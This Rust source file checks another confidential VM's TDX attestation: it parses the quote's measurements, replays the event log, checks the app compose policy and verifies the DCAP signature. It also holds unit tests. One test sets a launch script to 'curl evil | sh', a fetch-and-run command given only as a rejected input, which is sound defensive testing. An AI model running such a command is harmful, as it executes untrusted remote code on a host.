//! Checking another CVM's attestation from inside this one, before handing it the log: the checks of docs/tee.md, in Rust.

use anyhow::{anyhow, bail, Context, Result};
use desearch::canonical::hex;
use serde_json::Value;
use sha2::{Digest, Sha256, Sha384};

use crate::attestation::{decode_hex, report_data, DOCUMENT_KIND};

const HEADER: usize = 48;
const BODY: usize = 584;
const RUNTIME_EVENT: u32 = 0x0800_0001;
/// The only variables a deployment may hand the API outside the measured compose: storage credentials and the anchor hotkey.
pub const CREDENTIALS: [&str; 5] =
    ["CF_R2_ACCESS_KEY_ID", "CF_R2_SECRET_ACCESS_KEY", "PAGES_S3_ACCESS_KEY_ID", "PAGES_S3_SECRET_ACCESS_KEY", "TASK_API_ANCHOR_KEY_URI"];
/// Settings a compose must give at least this value, as `desearch/attestation.py` checks them too.
pub const MINIMUM_SETTINGS: [(&str, f64); 4] = [
    ("TASK_API_CHAIN_QUORUM", 2.0),
    ("TASK_API_ANCHOR_QUORUM", 2.0),
    ("TASK_API_UPLOAD_LOCK_S", crate::settings::CHECK_WINDOW_S),
    ("TASK_API_GOV_MIN_COLDKEYS", 3.0),
];
/// The TCB statuses a quote may have.
pub const TCB_STATUSES: [&str; 1] = ["UpToDate"];

/// The registers of a TD quote that say what booted.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Measurements {
    pub mrtd: String,
    pub rtmr: [String; 4],
    pub report_data: Vec<u8>,
    pub debug: bool,
}

impl Measurements {
    /// `mrtd:rtmr0:rtmr1:rtmr2`, the OS image and VM a CVM booted, as `TASK_API_SUCCESSOR_OS` lists them.
    pub fn os(&self) -> String {
        format!("{}:{}:{}:{}", self.mrtd, self.rtmr[0], self.rtmr[1], self.rtmr[2])
    }
}

/// The measurements of a TDX quote v4: the 48-byte header, then the TD report body.
pub fn measurements(quote: &[u8]) -> Result<Measurements> {
    if quote.len() < HEADER + BODY {
        bail!("a quote of {} bytes is too short for a TD report", quote.len());
    }
    let version = u16::from_le_bytes([quote[0], quote[1]]);
    let tee = u32::from_le_bytes(quote[4..8].try_into().expect("four bytes"));
    if version < 4 || tee != 0x81 {
        bail!("not a TDX quote (version {version}, TEE type {tee:#x})");
    }
    let body = &quote[HEADER..HEADER + BODY];
    let register = |at: usize| hex(&body[at..at + 48]);
    Ok(Measurements {
        // tee_tcb_svn 16, mrseam 48, mrsignerseam 48, seam_attributes 8, td_attributes 8, xfam 8.
        debug: body[120] & 1 == 1,
        mrtd: register(136),
        rtmr: [register(328), register(376), register(424), register(472)],
        report_data: body[520..584].to_vec(),
    })
}

/// The digest an event extends RTMR3 with: dstack's runtime events are hashed again from what they say.
fn event_digest(event: &Value) -> Result<Vec<u8>> {
    let kind = event["event_type"].as_u64().unwrap_or_default() as u32;
    if kind != RUNTIME_EVENT {
        return decode_hex(event["digest"].as_str().unwrap_or_default()).context("an event without a hex digest");
    }
    let name = event["event"].as_str().unwrap_or_default();
    let payload = decode_hex(event["event_payload"].as_str().unwrap_or_default()).context("an event payload that is not hex")?;
    let mut digest = Sha384::new();
    if event["version"].as_u64() == Some(2) {
        // JCS of {"name", "payload", "type"}: keys sorted, no spaces.
        let canonical = format!("{{\"name\":{},\"payload\":\"{}\",\"type\":{RUNTIME_EVENT}}}", Value::from(name), hex(&payload));
        digest.update(canonical.as_bytes());
    } else {
        digest.update(RUNTIME_EVENT.to_le_bytes());
        digest.update(b":");
        digest.update(name.as_bytes());
        digest.update(b":");
        digest.update(&payload);
    }
    Ok(digest.finalize().to_vec())
}

/// Each runtime event's name and payload, in the order they were measured.
pub type Events = Vec<(String, Vec<u8>)>;

/// RTMR3 replayed from the event log, and the runtime events it covers.
pub fn replay(event_log: &Value) -> Result<(String, Events)> {
    let mut rtmr = [0u8; 48];
    let mut events = Vec::new();
    for event in event_log.as_array().context("an event log that is not a list")? {
        if event["imr"].as_u64() != Some(3) {
            continue;
        }
        let mut next = Sha384::new();
        next.update(rtmr);
        next.update(event_digest(event)?);
        rtmr = next.finalize().into();
        if event["event_type"].as_u64() == Some(RUNTIME_EVENT as u64) {
            let payload = decode_hex(event["event_payload"].as_str().unwrap_or_default()).unwrap_or_default();
            events.push((event["event"].as_str().unwrap_or_default().to_string(), payload));
        }
    }
    Ok((hex(&rtmr), events))
}

/// Why an app compose may not run the API, None when it may.
pub fn compose_problem(app_compose: &Value) -> Option<String> {
    let flag = |name: &str| app_compose[name].as_bool().unwrap_or(false);
    if app_compose["runner"] != "docker-compose" {
        return Some(format!("runner {}", app_compose["runner"]));
    }
    if !flag("kms_enabled") || flag("local_key_provider_enabled") {
        return Some("the disk key must come from the KMS".into());
    }
    for script in ["pre_launch_script", "init_script"] {
        let present = match &app_compose[script] {
            Value::Null => false,
            Value::String(text) => !text.trim().is_empty(),
            Value::Array(items) => !items.is_empty(),
            _ => true,
        };
        if present {
            return Some(format!("a {script}"));
        }
    }
    let envs = app_compose["allowed_envs"].as_array().cloned().unwrap_or_default();
    if let Some(extra) = envs.iter().find(|name| !name.as_str().is_some_and(|name| CREDENTIALS.contains(&name))) {
        return Some(format!("allowed_envs lets in {extra}, which is not a credential"));
    }
    let compose = app_compose["docker_compose_file"].as_str().unwrap_or_default();
    for line in compose.lines().map(str::trim) {
        if let Some(image) = line.strip_prefix("image:") {
            if !image.contains("@sha256:") {
                return Some(format!("the image {} is not pinned by digest", image.trim()));
            }
        }
        if line.starts_with("privileged:") && line.ends_with("true") {
            return Some("a privileged container".into());
        }
        if line.starts_with("TASK_API_TEE_SIMULATED") && !line.ends_with(": \"0\"") && !line.ends_with("=0") {
            return Some("simulated attestation is switched on".into());
        }
    }
    let setting = |name: &str| {
        compose.lines().map(str::trim).find_map(|line| line.strip_prefix(name)?.strip_prefix(':')).map(|value| value.trim().trim_matches('"').to_string())
    };
    for (name, least) in MINIMUM_SETTINGS {
        if !setting(name).and_then(|v| v.parse::<f64>().ok()).is_some_and(|v| v >= least) {
            return Some(format!("{name} is {:?}, it must be at least {least}", setting(name)));
        }
    }
    if setting("TASK_API_ANCHOR_NETWORK").is_none_or(|v| v.is_empty()) {
        return Some("the log is not anchored: TASK_API_ANCHOR_NETWORK is empty".into());
    }
    None
}

/// What a successor's attestation proved: its signer, the key to send its state to, and its version.
#[derive(Clone, Debug)]
pub struct Attested {
    pub document: Value,
    pub compose_hash: String,
    pub os: String,
    pub ppid: Option<Vec<u8>>,
}

/// Checks an attestation as docs/tee.md says, against the OS measurements allowed; `dcap` verifies the quote's signature.
pub async fn check<F, Fut>(attestation: &Value, allowed_os: &[String], dcap: F) -> Result<Attested>
where
    F: FnOnce(Vec<u8>) -> Fut,
    Fut: std::future::Future<Output = Result<Option<Vec<u8>>>>,
{
    let quote = decode_hex(attestation["quote"].as_str().unwrap_or_default()).context("an attestation without a hex quote")?;
    let found = measurements(&quote)?;
    if found.debug {
        bail!("the TD runs in debug mode");
    }
    if !allowed_os.contains(&found.os()) {
        bail!("the OS measurements {} are not among the allowed", found.os());
    }
    let ppid = dcap(quote).await.context("the quote's signature")?;
    let (rtmr3, events) = replay(&attestation["event_log"])?;
    if rtmr3 != found.rtmr[3] {
        bail!("the event log replays RTMR3 to {rtmr3}, the quote has {}", found.rtmr[3]);
    }
    let event = |name: &str| events.iter().rev().find(|(n, _)| n == name).map(|(_, p)| hex(p));
    let compose_hash = event("compose-hash").ok_or_else(|| anyhow!("no compose-hash event"))?;
    let raw = attestation["app_compose"].as_str().context("no app compose")?;
    if hex(&Sha256::digest(raw.as_bytes())) != compose_hash {
        bail!("the app compose does not hash to the measured compose hash");
    }
    let app_compose: Value = serde_json::from_str(raw).context("an app compose that is not JSON")?;
    if let Some(problem) = compose_problem(&app_compose) {
        bail!("the app compose: {problem}");
    }
    let document = &attestation["document"];
    if document["kind"] != DOCUMENT_KIND || document["version"] != 1 {
        bail!("not a task API attestation");
    }
    if found.report_data != report_data(document) {
        bail!("the quote does not bind this document");
    }
    Ok(Attested { document: document.clone(), compose_hash, os: found.os(), ppid })
}

/// Intel's signature chain over a quote, from collateral the PCCS serves; the PPID of the machine when it holds.
pub async fn dcap(pccs_url: String, quote: Vec<u8>) -> Result<Option<Vec<u8>>> {
    let client = dcap_qvl::collateral::CollateralClient::with_default_http(pccs_url)?;
    let report = client.fetch_and_verify(&quote).await?;
    if !TCB_STATUSES.contains(&report.status.as_str()) {
        bail!("the platform's TCB is {}", report.status);
    }
    Ok(Some(report.ppid))
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    #[test]
    fn a_v2_event_hashes_its_canonical_json() {
        let event = json!({"imr": 3, "event_type": RUNTIME_EVENT, "event": "compose-hash", "event_payload": "abcd", "version": 2});
        let expected = Sha384::digest(br#"{"name":"compose-hash","payload":"abcd","type":134217729}"#).to_vec();
        assert_eq!(event_digest(&event).unwrap(), expected);
    }

    #[test]
    fn the_compose_policy_lets_in_credentials_and_pinned_images_only() {
        let settings = "      TASK_API_CHAIN_QUORUM: \"2\"\n      TASK_API_ANCHOR_QUORUM: \"2\"\n      TASK_API_UPLOAD_LOCK_S: \"86400\"\n      TASK_API_GOV_MIN_COLDKEYS: \"3\"\n      TASK_API_ANCHOR_NETWORK: finney\n";
        let file = format!("services:\n  api:\n    image: ghcr.io/x@sha256:00\n    environment:\n{settings}");
        let good = json!({"runner": "docker-compose", "kms_enabled": true, "allowed_envs": ["CF_R2_ACCESS_KEY_ID", "TASK_API_ANCHOR_KEY_URI"], "docker_compose_file": file});
        assert_eq!(compose_problem(&good), None);
        for (from, to) in
            [("UPLOAD_LOCK_S: \"86400\"", "UPLOAD_LOCK_S: \"0\""), ("CHAIN_QUORUM: \"2\"", "CHAIN_QUORUM: \"1\""), ("NETWORK: finney", "NETWORK: \"\"")]
        {
            let mut weak = good.clone();
            weak["docker_compose_file"] = file.replace(from, to).into();
            assert!(compose_problem(&weak).is_some(), "{to}");
        }
        let mut bad = good.clone();
        bad["allowed_envs"] = json!(["TASK_API_CLAIM_TTL"]);
        assert!(compose_problem(&bad).unwrap().contains("not a credential"));
        let mut bad = good.clone();
        bad["docker_compose_file"] = file.replace("ghcr.io/x@sha256:00", "redis:7").into();
        assert!(compose_problem(&bad).unwrap().contains("not pinned"));
        let mut bad = good.clone();
        bad["pre_launch_script"] = "curl evil | sh".into();
        assert!(compose_problem(&bad).is_some());
        let mut bad = good;
        bad["local_key_provider_enabled"] = true.into();
        assert!(compose_problem(&bad).is_some());
    }
}
